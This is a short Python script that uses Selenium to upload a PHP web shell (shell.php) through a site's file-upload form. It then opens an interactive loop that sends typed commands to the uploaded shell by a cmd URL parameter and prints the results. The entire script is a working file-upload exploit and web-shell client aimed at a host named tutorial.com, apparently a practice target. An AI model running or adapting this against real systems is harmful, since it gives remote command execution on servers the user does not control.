#!/usr/bin/python
#-*- coding: utf-8 -*-
#Autor: Luis Angel Ramirez Mendoza

from selenium import webdriver
import time, requests

#upload file
driver = webdriver.Chrome()
driver.get("http://tutorial.com/upload/upload/")
s = driver.find_element("xpath", '//*[@id="uploadfile"]')
s.send_keys("C:/Users/Luis_Ramirez/Desktop/tutorial/shell.php")
time.sleep(0.1)
driver.find_element("xpath", '//*[@id="button"]').click()
time.sleep(0.3)
driver.close()

#shell

while True:
	try:
		print("The payload is charged you can enter commands!!!")
		cmd = input("shell: ")
		print(requests.get("http://tutorial.com/upload/upload/" + "shell.php" + "/?cmd=" + cmd).text)
		time.sleep(0.3)

	except requests.exceptions.InvalidSchema:
		print("Invalid URL Schema http:// or https://")

	except requests.exceptions.ConnectionError:
		print("Url is invalid")





